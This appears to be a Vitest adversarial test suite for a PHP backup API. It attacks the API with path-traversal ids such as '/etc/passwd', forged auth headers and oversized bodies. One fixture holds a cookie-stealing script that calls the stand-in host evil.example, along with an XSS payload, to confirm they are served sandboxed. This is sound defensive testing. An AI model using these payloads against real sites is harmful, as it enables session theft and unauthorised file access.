// @vitest-environment node
// Portão adversarial da API de backups (03.5): roda public/api/backups.php DE VERDADE (PHP 8: servidor embutido e CGI) e, além
// do ciclo feliz, ataca: id com ../, método errado, mutação sem X-Lux-Requisicao, corpo > 5 MB, HTML sem lux-estado, chave de API
// na config e no backup, 11º backup, criação simultânea (processos CGI paralelos, flock), sem senha e cabeçalho de senha forjado.
// A suíte funcional prova o comportamento pretendido; estes ataques provam a ausência do caminho não pretendido.
import { spawn } from 'node:child_process';
import { existsSync, mkdirSync, readdirSync, readFileSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { unzipSync } from 'fflate';
import { afterAll, describe, expect, it } from 'vitest';
import { AUTH_TESTE, PHP, subirApi, type AmbienteApi } from './api_local.ts';

const PHP_CGI = PHP.cgi;
const AUTH = AUTH_TESTE;
const ID = /^bk_\d{8}_\d{6}_[0-9a-f]{8}$/;
const falsa = (...partes: string[]) => partes.join('-');
const CHAVE_FALSA = falsa('sk', 'or', 'v1', 'abcdef1234567890');

type Ambiente = AmbienteApi;
const abertos: Ambiente[] = [];
afterAll(() => abertos.forEach((a) => a.parar()));

const CONFIG_LLM = { schema_versao: 1, teto_mensal_brl: 0, alerta_percentual: 95, limite_diario_requisicoes: 50, modelos: ['google/gemma-4-31b-it:free', 'qwen/qwen3.8-27b:free'], atualizado_em: '2026-09-25T10:00:00.000Z' };

/** Sobe uma cópia da API com a sua própria pasta de backups. `producao`: config sem modo_teste; REMOTE_USER só via cabeçalho de teste (simula o Apache). */
async function subir(o: { limite?: number; producao?: boolean; semConfig?: boolean } = {}): Promise<Ambiente> {
  const amb = await subirApi(o);
  abertos.push(amb);
  return amb;
}

interface Opcoes {
  metodo?: string;
  corpo?: unknown;
  /** `null` = não envia o cabeçalho de tipo. */
  tipo?: string | null;
  /** `null` = não envia X-Lux-Requisicao. */
  requisicao?: string | null;
  /** `false` = sem senha; string = cabeçalho Authorization literal. */
  auth?: boolean | string;
  query?: Record<string, string>;
  cabecalhos?: Record<string, string>;
}
async function chamar(amb: Ambiente, acao: string | null, o: Opcoes = {}) {
  const metodo = o.metodo ?? (o.corpo !== undefined ? 'POST' : 'GET');
  const u = new URL(amb.url);
  if (acao !== null) u.searchParams.set('acao', acao);
  for (const [k, v] of Object.entries(o.query ?? {})) u.searchParams.set(k, v);
  const cab: Record<string, string> = { ...o.cabecalhos };
  const auth = o.auth ?? true;
  if (auth === true) cab.Authorization = AUTH;
  else if (typeof auth === 'string') cab.Authorization = auth;
  if (metodo !== 'GET' && o.requisicao !== null) cab['X-Lux-Requisicao'] = o.requisicao ?? '1';
  if (o.corpo !== undefined && o.tipo !== null) cab['Content-Type'] = o.tipo ?? 'application/json';
  const r = await fetch(u, { method: metodo, headers: cab, body: o.corpo === undefined ? undefined : typeof o.corpo === 'string' ? o.corpo : JSON.stringify(o.corpo) });
  const bytes = new Uint8Array(await r.arrayBuffer());
  const texto = new TextDecoder().decode(bytes);
  let json: Record<string, unknown> | null = null;
  try {
    json = JSON.parse(texto) as Record<string, unknown>;
  } catch {
    // não é JSON (download)
  }
  return { status: r.status, headers: r.headers, bytes, texto, json };
}

const ESTADO = { schema_versao: 1, fpe_edicoes: {}, pop_respostas: {}, gerado_em: '2026-09-25T10:00:00.000Z' };
const html = (estado: unknown = ESTADO, extra = '') => `<!doctype html><html lang="pt-BR"><body><h1>Backup</h1>${extra}<script type="application/json" id="lux-estado">${JSON.stringify(estado)}</script></body></html>`;
const criar = (amb: Ambiente, extra: Record<string, unknown> = {}, h = html()) => chamar(amb, 'criar', { corpo: { html: h, rotulo: 'teste', escopo: 'completo', versao_app: '0.1.0', ...extra } });
const idDe = (r: { json: Record<string, unknown> | null }) => r.json?.id as string;
const arquivosDe = (amb: Ambiente) => (existsSync(amb.dir) ? readdirSync(amb.dir) : []);

// ---------------------------------------------------------------------------------------------
describe('ciclo feliz', () => {
  it('criar → listar → baixar → ver → renomear → proteger → zip → excluir', async () => {
    const amb = await subir();
    const c = await criar(amb, { rotulo: 'Primeira versão' });
    expect(c.status).toBe(201);
    const id = idDe(c);
    expect(id).toMatch(ID);
    expect(c.json).toMatchObject({ limite: 10, total: 1 });
    expect(c.json?.item).toMatchObject({ id, rotulo: 'Primeira versão', escopo: 'completo', versao_app: '0.1.0', protegido: false });

    const l = await chamar(amb, 'listar');
    expect(l.status).toBe(200);
    expect(l.json).toMatchObject({ limite: 10, total: 1 });
    const item = (l.json!.itens as Record<string, unknown>[])[0]!;
    expect(item).toMatchObject({ id, tamanho_bytes: html().length, protegido: false });
    expect(item.sha256).toMatch(/^[0-9a-f]{64}$/);
    expect(new Date(item.criado_em as string).getTime()).not.toBeNaN();

    const b = await chamar(amb, 'baixar', { query: { id } });
    expect(b.status).toBe(200);
    expect(b.texto).toBe(html());
    expect(b.headers.get('content-disposition')).toBe(`attachment; filename="${id}.html"`);
    expect(b.headers.get('content-type')).toContain('text/html');
    expect(b.headers.get('x-content-type-options')).toBe('nosniff');
    expect(b.headers.get('content-security-policy')).toMatch(/^sandbox;/);

    const v = await chamar(amb, 'ver', { query: { id } });
    expect(v.status).toBe(200);
    expect(v.headers.get('content-disposition')).toBe(`inline; filename="${id}.html"`);
    expect(v.headers.get('content-security-policy')).toContain('sandbox');

    const r = await chamar(amb, 'renomear', { corpo: { id, rotulo: 'Versão final' } });
    expect(r.json?.item).toMatchObject({ rotulo: 'Versão final' });
    const p = await chamar(amb, 'proteger', { corpo: { id, valor: true } });
    expect(p.json?.item).toMatchObject({ protegido: true });

    const z = await chamar(amb, 'baixar_zip', { corpo: { ids: [id] } });
    expect(z.status).toBe(200);
    expect(z.headers.get('content-type')).toBe('application/zip');
    expect(Object.keys(unzipSync(z.bytes))).toEqual([`${id}.html`]);

    const e1 = await chamar(amb, 'excluir', { corpo: { ids: [id] } });
    expect(e1.json).toMatchObject({ excluidos: [], ignorados_protegidos: [id], inexistentes: [] }); // protegido não sai
    await chamar(amb, 'proteger', { corpo: { id, valor: false } });
    const e2 = await chamar(amb, 'excluir', { corpo: { ids: [id] } });
    expect(e2.status).toBe(200);
    expect(e2.json).toMatchObject({ excluidos: [id], ignorados_protegidos: [] });
    expect((await chamar(amb, 'listar')).json).toMatchObject({ total: 0, itens: [] });
    expect(arquivosDe(amb).filter((a) => a.startsWith('bk_'))).toEqual([]);
  });

  it('a lista vem da mais nova para a mais antiga; excluir em lote tira só os não protegidos', async () => {
    const amb = await subir();
    const ids: string[] = [];
    for (let i = 0; i < 3; i++) ids.push(idDe(await criar(amb, { rotulo: `v${i}` })));
    await chamar(amb, 'proteger', { corpo: { id: ids[1], valor: true } });
    const rotulos = ((await chamar(amb, 'listar')).json!.itens as { rotulo: string }[]).map((i) => i.rotulo);
    expect(new Set(rotulos)).toEqual(new Set(['v0', 'v1', 'v2']));
    const e = await chamar(amb, 'excluir', { corpo: { ids } });
    expect((e.json!.excluidos as string[]).sort()).toEqual([ids[0], ids[2]].sort());
    expect(e.json?.ignorados_protegidos).toEqual([ids[1]]);
    expect((await chamar(amb, 'listar')).json?.total).toBe(1);
  });

  it('config_llm: ainda não existe → grava → lê igual', async () => {
    const amb = await subir();
    expect((await chamar(amb, 'config_ler')).json).toEqual({ existe: false, config: null });
    const g = await chamar(amb, 'config_gravar', { corpo: CONFIG_LLM });
    expect(g.status).toBe(200);
    expect((await chamar(amb, 'config_ler')).json).toEqual({ existe: true, config: CONFIG_LLM });
  });

  it('o rótulo é texto: HTML fica como caracteres, controle é removido e passa de 80 é cortado', async () => {
    const amb = await subir();
    const c = await criar(amb, { rotulo: `  <img src=x onerror=alert(1)>\u0000\u0007 ${'x'.repeat(200)}` });
    expect(c.status).toBe(201);
    const rotulo = (c.json!.item as { rotulo: string }).rotulo;
    expect(rotulo.startsWith('<img src=x onerror=alert(1)> x')).toBe(true);
    expect(rotulo.length).toBe(80);
    expect(c.headers.get('content-type')).toContain('application/json');
  });

  it('não sobra arquivo temporário depois das operações', async () => {
    const amb = await subir();
    const id = idDe(await criar(amb));
    await chamar(amb, 'renomear', { corpo: { id, rotulo: 'novo' } });
    await chamar(amb, 'config_gravar', { corpo: CONFIG_LLM });
    expect(arquivosDe(amb).filter((a) => a.endsWith('.tmp'))).toEqual([]);
  });
});

// ---------------------------------------------------------------------------------------------
describe('limite de 10 versões', () => {
  it('o 11º é recusado com 409, nada é apagado, e depois de excluir um o salvamento volta', async () => {
    const amb = await subir();
    const ids: string[] = [];
    for (let i = 0; i < 10; i++) {
      const c = await criar(amb, { rotulo: `v${i}` });
      expect(c.status, `v${i}`).toBe(201);
      ids.push(idDe(c));
    }
    const onze = await criar(amb, { rotulo: 'onze' });
    expect(onze.status).toBe(409);
    expect(onze.json).toMatchObject({ erro: 'limite_atingido', limite: 10, total: 10 });
    const l = await chamar(amb, 'listar');
    expect(l.json?.total).toBe(10);
    expect((l.json!.itens as { id: string }[]).map((i) => i.id).sort()).toEqual([...ids].sort());
    expect((await chamar(amb, 'excluir', { corpo: { ids: [ids[0]] } })).status).toBe(200);
    expect((await criar(amb, { rotulo: 'onze de novo' })).status).toBe(201);
  });

  it('o teto rígido de 10 vale mesmo se a configuração pedir mais', async () => {
    const amb = await subir({ limite: 50 });
    expect((await chamar(amb, 'listar')).json?.limite).toBe(10);
    for (let i = 0; i < 10; i++) await criar(amb);
    expect((await criar(amb)).status).toBe(409);
  });

  it('um limite menor na configuração também vale', async () => {
    const amb = await subir({ limite: 2 });
    await criar(amb);
    await criar(amb);
    expect((await criar(amb)).json).toMatchObject({ erro: 'limite_atingido', limite: 2, total: 2 });
  });

  it('criação SIMULTÂNEA (15 processos CGI paralelos) não fura o limite: exatamente 10 entram', async () => {
    const amb = await subir();
    const corpo = JSON.stringify({ html: html(), rotulo: 'paralelo', escopo: 'completo', versao_app: '0.1.0' });
    const rodar = () =>
      new Promise<number>((ok, falha) => {
        const f = spawn(PHP_CGI, [...PHP.ini], {
          env: {
            ...process.env,
            REDIRECT_STATUS: '200',
            SCRIPT_FILENAME: join(amb.docroot, 'backups.php'),
            DOCUMENT_ROOT: amb.docroot,
            REQUEST_METHOD: 'POST',
            QUERY_STRING: 'acao=criar',
            CONTENT_TYPE: 'application/json',
            CONTENT_LENGTH: String(Buffer.byteLength(corpo)),
            HTTP_X_LUX_REQUISICAO: '1',
            REMOTE_USER: 'teste',
          },
          stdio: ['pipe', 'pipe', 'ignore'],
        });
        let saida = '';
        f.stdout.on('data', (d: Buffer) => (saida += d.toString()));
        f.on('error', falha);
        f.on('close', () => ok(Number(/Status:\s*(\d{3})/i.exec(saida)?.[1] ?? 200)));
        f.stdin.end(corpo);
      });
    const status = await Promise.all(Array.from({ length: 15 }, rodar));
    expect(status.filter((s) => s === 201)).toHaveLength(10);
    expect(status.filter((s) => s === 409)).toHaveLength(5);
    expect((await chamar(amb, 'listar')).json?.total).toBe(10);
    expect(arquivosDe(amb).filter((a) => a.endsWith('_meta.json'))).toHaveLength(10);
  }, 60_000);
});

// ---------------------------------------------------------------------------------------------
describe('ataques: identificador (path traversal)', () => {
  const ruins = ['../../.env', '../sentinela', 'bk_20260101_000000_zzzzzzzz', 'bk_20260101_000000_ABCDEF12', 'bk_20260101_000000_abcdef12/../../x', '%2e%2e%2f%2e%2e%2f.env', 'bk_20260101_000000_abcdef12.html', 'bk_20260101_000000_abcdef1', 'bk_2026_000000_abcdef12', ' bk_20260101_000000_abcdef12', 'bk_20260101_000000_abcdef12\n', '..\\..\\x', '/etc/passwd', 'C:\\Windows\\win.ini', '', 'a'.repeat(5000)];

  it.each(ruins.map((id) => [JSON.stringify(id).slice(0, 50), id] as const))('id %s → 400 e nada fora da pasta é tocado', async (_nome, id) => {
    const amb = await subir();
    const sentinela = join(amb.dir, '..', 'sentinela');
    mkdirSync(amb.dir, { recursive: true });
    writeFileSync(sentinela, 'não me apague');
    for (const acao of ['baixar', 'ver']) expect((await chamar(amb, acao, { query: { id } })).status, `${acao}`).toBe(400);
    expect((await chamar(amb, 'excluir', { corpo: { ids: [id] } })).status).toBe(400);
    expect((await chamar(amb, 'baixar_zip', { corpo: { ids: [id] } })).status).toBe(400);
    expect((await chamar(amb, 'renomear', { corpo: { id, rotulo: 'x' } })).status).toBe(400);
    expect((await chamar(amb, 'proteger', { corpo: { id, valor: true } })).status).toBe(400);
    expect(readFileSync(sentinela, 'utf8')).toBe('não me apague');
  });

  it('id que não é texto (array, objeto, número, nulo) é recusado', async () => {
    const amb = await subir();
    for (const id of [[], {}, 123, null, true, ['bk_20260101_000000_abcdef12']]) {
      expect((await chamar(amb, 'renomear', { corpo: { id, rotulo: 'x' } })).status).toBe(400);
    }
    expect((await chamar(amb, 'baixar', { query: {} })).status).toBe(400);
    const u = await fetch(`${amb.url}?acao=baixar&id[]=x`, { headers: { Authorization: AUTH } });
    expect(u.status).toBe(400);
  });

  it('id válido que não existe → 404; lista de ids fora do formato (vazia, grande demais, com repetição inválida) → 400', async () => {
    const amb = await subir();
    expect((await chamar(amb, 'baixar', { query: { id: 'bk_20260101_000000_abcdef12' } })).status).toBe(404);
    expect((await chamar(amb, 'baixar_zip', { corpo: { ids: ['bk_20260101_000000_abcdef12'] } })).status).toBe(404);
    expect((await chamar(amb, 'excluir', { corpo: { ids: ['bk_20260101_000000_abcdef12'] } })).json?.inexistentes).toEqual(['bk_20260101_000000_abcdef12']);
    for (const ids of [[], 'bk_20260101_000000_abcdef12', { 0: 'x' }, Array.from({ length: 51 }, (_, i) => `bk_20260101_00000${i % 10}_abcdef12`)]) {
      expect((await chamar(amb, 'excluir', { corpo: { ids } })).status).toBe(400);
    }
  });
});

// ---------------------------------------------------------------------------------------------
describe('ataques: método, cabeçalho de segurança e tipo do corpo', () => {
  it('método errado → 405 com Allow', async () => {
    const amb = await subir();
    for (const [acao, metodo, esperado] of [['criar', 'GET', 'POST'], ['excluir', 'GET', 'POST'], ['listar', 'POST', 'GET'], ['baixar', 'POST', 'GET'], ['config_ler', 'POST', 'GET'], ['config_gravar', 'GET', 'POST']] as const) {
      const r = await chamar(amb, acao, { metodo, corpo: metodo === 'POST' ? {} : undefined });
      expect(r.status, `${acao} ${metodo}`).toBe(405);
      expect(r.headers.get('allow')).toBe(esperado);
    }
    for (const metodo of ['PUT', 'DELETE', 'PATCH', 'OPTIONS']) expect((await chamar(amb, 'criar', { metodo, corpo: {} })).status, metodo).toBe(405);
  });

  it('toda mutação sem X-Lux-Requisicao: 1 → 403, e nada é criado, alterado ou apagado', async () => {
    const amb = await subir();
    const id = idDe(await criar(amb));
    const corpos: [string, unknown][] = [['criar', { html: html() }], ['excluir', { ids: [id] }], ['renomear', { id, rotulo: 'hack' }], ['proteger', { id, valor: true }], ['baixar_zip', { ids: [id] }], ['config_gravar', CONFIG_LLM]];
    for (const [acao, corpo] of corpos) {
      for (const requisicao of [null, '0', '', 'true', '11']) expect((await chamar(amb, acao, { corpo, requisicao })).status, `${acao} [${requisicao}]`).toBe(403);
    }
    const l = await chamar(amb, 'listar');
    expect(l.json?.total).toBe(1);
    expect((l.json!.itens as { rotulo: string; protegido: boolean }[])[0]).toMatchObject({ rotulo: 'teste', protegido: false });
    expect((await chamar(amb, 'config_ler')).json?.existe).toBe(false);
  });

  it('tipo de corpo diferente de application/json → 415 (formulário de outra origem, texto puro, ausente)', async () => {
    const amb = await subir();
    for (const tipo of ['text/plain', 'application/x-www-form-urlencoded', 'multipart/form-data; boundary=x', 'text/html', null]) {
      const r = await chamar(amb, 'criar', { corpo: JSON.stringify({ html: html() }), tipo });
      expect(r.status, String(tipo)).toBe(415);
    }
    expect((await chamar(amb, 'criar', { corpo: { html: html() }, tipo: 'Application/JSON; charset=utf-8' })).status).toBe(201);
  });

  it('JSON quebrado, vazio, não-objeto ou profundo demais → 400', async () => {
    const amb = await subir();
    for (const corpo of ['{não é json', '', '[1,2,3]', '"texto"', '42', 'null', `${'['.repeat(100)}${']'.repeat(100)}`]) {
      const r = await chamar(amb, 'criar', { corpo });
      expect([400, 415], JSON.stringify(corpo).slice(0, 30)).toContain(r.status);
      expect(r.status === 400 || r.json?.erro === 'tipo_nao_aceito').toBe(true);
    }
    expect((await chamar(amb, 'criar', { corpo: '{não é json' })).json?.erro).toBe('json_invalido');
  });

  it('texto com UTF-16 inválido no JSON (surrogate solto) → 400 e nada é guardado', async () => {
    const amb = await subir();
    const r = await chamar(amb, 'criar', { corpo: '{"html":"<p>\\ud800</p>"}' });
    expect(r.status).toBe(400);
    expect((await chamar(amb, 'listar')).json?.total).toBe(0);
  });

  it('ação desconhecida, ausente ou em formato estranho → 400', async () => {
    const amb = await subir();
    for (const acao of ['apagar_tudo', '', 'LISTAR', 'listar ', '../listar', 'phpinfo']) expect((await chamar(amb, acao)).status, acao).toBe(400);
    expect((await chamar(amb, null)).status).toBe(400);
    expect((await fetch(`${amb.url}?acao[]=listar`, { headers: { Authorization: AUTH } })).status).toBe(400);
  });

  it('campos de metadados fora do formato são recusados', async () => {
    const amb = await subir();
    expect((await criar(amb, { escopo: 'tudo' })).status).toBe(400);
    expect((await criar(amb, { escopo: ['fpe'] })).status).toBe(400);
    for (const versao_app of ['1.0; drop', '../1', 'a'.repeat(33), 5, ['1']]) expect((await criar(amb, { versao_app })).status, String(versao_app)).toBe(400);
    for (const rotulo of [42, ['a'], { a: 1 }]) expect((await criar(amb, { rotulo })).status).toBe(400);
    expect((await chamar(amb, 'listar')).json?.total).toBe(0);
  });
});

// ---------------------------------------------------------------------------------------------
describe('ataques: tamanho e conteúdo do backup', () => {
  it('HTML de mais de 5 MB → 413; exatamente no limite passa', async () => {
    const amb = await subir();
    const acima = await criar(amb, {}, `${'a'.repeat(5 * 1024 * 1024)}${html()}`);
    expect(acima.status).toBe(413);
    expect(acima.json?.erro).toBe('backup_grande_demais');
    const base = html();
    const noLimite = await criar(amb, {}, `${'a'.repeat(5 * 1024 * 1024 - base.length)}${base}`);
    expect(noLimite.status).toBe(201);
    expect(noLimite.json?.item).toMatchObject({ tamanho_bytes: 5 * 1024 * 1024 });
  }, 60_000);

  it('corpo de mais de 8 MB → 413 sem ler tudo', async () => {
    const amb = await subir();
    const r = await chamar(amb, 'criar', { corpo: JSON.stringify({ html: 'a'.repeat(9 * 1024 * 1024) }) });
    expect(r.status).toBe(413);
    expect(r.json?.erro).toBe('corpo_grande_demais');
    expect((await chamar(amb, 'listar')).json?.total).toBe(0);
  }, 60_000);

  it.each([
    ['sem o bloco lux-estado', '<html><body>oi</body></html>'],
    ['bloco com outro id', '<script type="application/json" id="outro">{"schema_versao":1,"fpe_edicoes":{},"pop_respostas":{}}</script>'],
    ['bloco com tipo errado', '<script type="text/javascript" id="lux-estado">{"schema_versao":1,"fpe_edicoes":{},"pop_respostas":{}}</script>'],
    ['JSON quebrado', '<script type="application/json" id="lux-estado">{schema_versao: 1</script>'],
    ['JSON que não é objeto', '<script type="application/json" id="lux-estado">[1,2]</script>'],
    ['schema_versao 2', `<script type="application/json" id="lux-estado">${JSON.stringify({ ...ESTADO, schema_versao: 2 })}</script>`],
    ['schema_versao como texto', `<script type="application/json" id="lux-estado">${JSON.stringify({ ...ESTADO, schema_versao: '1' })}</script>`],
    ['sem fpe_edicoes', `<script type="application/json" id="lux-estado">${JSON.stringify({ schema_versao: 1, pop_respostas: {} })}</script>`],
    ['pop_respostas que não é objeto', `<script type="application/json" id="lux-estado">${JSON.stringify({ schema_versao: 1, fpe_edicoes: {}, pop_respostas: 'x' })}</script>`],
    ['bloco vazio', '<script type="application/json" id="lux-estado"></script>'],
  ])('HTML %s → 422 e nada é guardado', async (_nome, corpoHtml) => {
    const amb = await subir();
    const r = await criar(amb, {}, corpoHtml);
    expect(r.status).toBe(422);
    expect(r.json?.erro).toBe('backup_invalido');
    expect((await chamar(amb, 'listar')).json?.total).toBe(0);
    expect(arquivosDe(amb).filter((a) => a.startsWith('bk_'))).toEqual([]);
  });

  it('backup com chave de API dentro (no estado ou solta no HTML) → 422: chave nunca é guardada', async () => {
    const amb = await subir();
    for (const estado of [{ ...ESTADO, api_key: 'x' }, { ...ESTADO, fpe_edicoes: { a: { apiKey: 'x' } } }, { ...ESTADO, chave_openrouter: 'x' }, { ...ESTADO, senha: 'x' }, { ...ESTADO, authorization: 'Bearer x' }]) {
      expect((await criar(amb, {}, html(estado))).status, JSON.stringify(estado).slice(0, 60)).toBe(422);
    }
    for (const solta of [CHAVE_FALSA, falsa('sk', 'ant', 'api03', 'exemplo', 'falso', 'de', 'teste'), falsa('sk', 'proj', 'exemplo', 'falso', 'de', 'teste')]) {
      expect((await criar(amb, {}, html(ESTADO, `<p>${solta}</p>`))).status, solta).toBe(422);
    }
    expect((await chamar(amb, 'listar')).json?.total).toBe(0);
  });

  it('HTML hostil dentro do backup é guardado como dado e entregue com sandbox: sem scripts nem rede', async () => {
    const amb = await subir();
    const hostil = html(ESTADO, '<script>fetch("https://evil.example/?"+document.cookie)</script><img src=x onerror=alert(1)>');
    const id = idDe(await criar(amb, {}, hostil));
    expect(id).toMatch(ID);
    for (const acao of ['baixar', 'ver']) {
      const r = await chamar(amb, acao, { query: { id } });
      expect(r.texto).toBe(hostil); // guardado byte a byte, nunca executado nem reescrito pelo servidor
      const csp = r.headers.get('content-security-policy') ?? '';
      expect(csp).toContain('sandbox');
      expect(csp).toContain("default-src 'none'");
      expect(csp).not.toMatch(/allow-scripts|script-src/);
    }
  });

  it('config_llm com chave de API, campo extra, faixa errada ou modelo pago → 422 e nada é gravado', async () => {
    const amb = await subir();
    const ruins: Record<string, unknown>[] = [
      { ...CONFIG_LLM, api_key: CHAVE_FALSA },
      { ...CONFIG_LLM, apiKey: 'x' },
      { ...CONFIG_LLM, chave: 'x' },
      { ...CONFIG_LLM, token: 'x' },
      { ...CONFIG_LLM, qualquer_outro: 1 },
      { ...CONFIG_LLM, teto_mensal_brl: 10001 },
      { ...CONFIG_LLM, teto_mensal_brl: -1 },
      { ...CONFIG_LLM, teto_mensal_brl: '5' },
      { ...CONFIG_LLM, teto_mensal_brl: null },
      { ...CONFIG_LLM, alerta_percentual: 0 },
      { ...CONFIG_LLM, alerta_percentual: 101 },
      { ...CONFIG_LLM, alerta_percentual: 50.5 },
      { ...CONFIG_LLM, limite_diario_requisicoes: -1 },
      { ...CONFIG_LLM, limite_diario_requisicoes: 100001 },
      { ...CONFIG_LLM, limite_diario_requisicoes: 5.5 },
      { ...CONFIG_LLM, modelos: [] },
      { ...CONFIG_LLM, modelos: ['a/b:free', 'c/d:free', 'e/f:free', 'g/h:free'] },
      { ...CONFIG_LLM, modelos: ['openai/gpt-4o'] },
      { ...CONFIG_LLM, modelos: ['a/b:free', 'a/b:free'] },
      { ...CONFIG_LLM, modelos: 'a/b:free' },
      { ...CONFIG_LLM, modelos: [5] },
      { ...CONFIG_LLM, schema_versao: 2 },
      { ...CONFIG_LLM, preco_entrada_brl_por_milhao: -5 },
      { ...CONFIG_LLM, preco_saida_brl_por_milhao: 'caro' },
      { ...CONFIG_LLM, atualizado_em: 'x'.repeat(41) },
      { ...CONFIG_LLM, atualizado_em: 5 },
    ];
    for (const c of ruins) expect((await chamar(amb, 'config_gravar', { corpo: c })).status, JSON.stringify(c).slice(-70)).toBe(422);
    expect((await chamar(amb, 'config_ler')).json).toEqual({ existe: false, config: null });
    expect(arquivosDe(amb).includes('configuracao_llm.json')).toBe(false);
    const g = await chamar(amb, 'config_gravar', { corpo: { ...CONFIG_LLM, api_key: CHAVE_FALSA } });
    expect(g.json?.mensagem).toMatch(/chave de API/);
    expect(g.texto).not.toContain('abcdef1234567890');
  });

  it('config_llm estragada no disco volta ao padrão em vez de derrubar a API', async () => {
    const amb = await subir();
    mkdirSync(amb.dir, { recursive: true });
    writeFileSync(join(amb.dir, 'configuracao_llm.json'), '{"schema_versao":1,"api_key":"x"}');
    expect((await chamar(amb, 'config_ler')).json).toEqual({ existe: false, config: null });
    writeFileSync(join(amb.dir, 'configuracao_llm.json'), 'lixo');
    expect((await chamar(amb, 'config_ler')).json).toEqual({ existe: false, config: null });
  });
});

// ---------------------------------------------------------------------------------------------
describe('ataques: sem senha e senha forjada', () => {
  const todas: [string, Opcoes][] = [
    ['listar', {}],
    ['baixar', { query: { id: 'bk_20260101_000000_abcdef12' } }],
    ['ver', { query: { id: 'bk_20260101_000000_abcdef12' } }],
    ['config_ler', {}],
    ['criar', { corpo: { html: html() } }],
    ['excluir', { corpo: { ids: ['bk_20260101_000000_abcdef12'] } }],
    ['baixar_zip', { corpo: { ids: ['bk_20260101_000000_abcdef12'] } }],
    ['renomear', { corpo: { id: 'bk_20260101_000000_abcdef12', rotulo: 'x' } }],
    ['proteger', { corpo: { id: 'bk_20260101_000000_abcdef12', valor: true } }],
    ['config_gravar', { corpo: CONFIG_LLM }],
  ];

  it('sem usuário autenticado toda ação responde 401 (mesmo com o cabeçalho de segurança) e nada é gravado', async () => {
    const amb = await subir();
    for (const [acao, o] of todas) {
      const r = await chamar(amb, acao, { ...o, auth: false });
      expect(r.status, acao).toBe(401);
      expect(r.json?.erro).toBe('nao_autenticado');
      expect(r.headers.get('www-authenticate')).toMatch(/^Basic/);
    }
    expect(arquivosDe(amb).filter((a) => a.startsWith('bk_') || a.endsWith('.json'))).toEqual([]);
  });

  it('em produção (sem modo_teste), o cabeçalho Authorization mandado pelo cliente NÃO autentica: só REMOTE_USER do servidor web', async () => {
    const amb = await subir({ producao: true });
    for (const auth of [AUTH, `Basic ${Buffer.from('admin:admin').toString('base64')}`, 'Bearer qualquer']) {
      expect((await chamar(amb, 'listar', { auth })).status).toBe(401);
      expect((await chamar(amb, 'criar', { corpo: { html: html() }, auth })).status).toBe(401);
    }
    // cabeçalhos que só o servidor web deveria definir não vêm do cliente: o PHP lê $_SERVER, não cabeçalhos livres
    for (const nome of ['REMOTE_USER', 'X-Remote-User', 'Remote-User', 'X-Forwarded-User', 'REDIRECT_REMOTE_USER']) {
      expect((await chamar(amb, 'listar', { auth: false, cabecalhos: { [nome]: 'max' } })).status, nome).toBe(401);
    }
    // o servidor web autenticou (REMOTE_USER definido): agora passa
    const ok = await chamar(amb, 'listar', { auth: false, cabecalhos: { 'X-Teste-Remote-User': 'max' } });
    expect(ok.status).toBe(200);
  });

  it('sem configuração no servidor a API recusa com mensagem simples e sem vazar caminho', async () => {
    const amb = await subir({ semConfig: true });
    const r = await chamar(amb, 'listar');
    expect(r.status).toBe(500);
    expect(r.json?.erro).toBe('configuracao_ausente');
    expect(r.texto).not.toMatch(/[A-Za-z]:\\|\/home|\/tmp|lux_api_/);
  });

  it('toda resposta (inclusive erro) leva no-store e nosniff', async () => {
    const amb = await subir();
    for (const r of [await chamar(amb, 'listar'), await chamar(amb, 'listar', { auth: false }), await chamar(amb, 'x'), await chamar(amb, 'criar', { corpo: {}, requisicao: null })]) {
      expect(r.headers.get('cache-control')).toBe('no-store');
      expect(r.headers.get('x-content-type-options')).toBe('nosniff');
    }
  });
});

// ---------------------------------------------------------------------------------------------
describe('ZIP em lote', () => {
  it('leva só os pedidos, com nomes bk_*.html e o conteúdo intacto', async () => {
    const amb = await subir();
    const h = [html(ESTADO, '<p>um</p>'), html(ESTADO, '<p>dois</p>'), html(ESTADO, '<p>três</p>')];
    const ids: string[] = [];
    for (const conteudo of h) ids.push(idDe(await criar(amb, {}, conteudo)));
    const z = await chamar(amb, 'baixar_zip', { corpo: { ids: [ids[0], ids[2], ids[0]] } });
    const arquivos = unzipSync(z.bytes);
    expect(Object.keys(arquivos).sort()).toEqual([`${ids[0]}.html`, `${ids[2]}.html`].sort());
    expect(new TextDecoder().decode(arquivos[`${ids[2]}.html`]!)).toBe(h[2]);
    expect((await chamar(amb, 'baixar_zip', { corpo: { ids: [ids[0], 'bk_20260101_000000_abcdef12'] } })).status).toBe(404);
  });
});
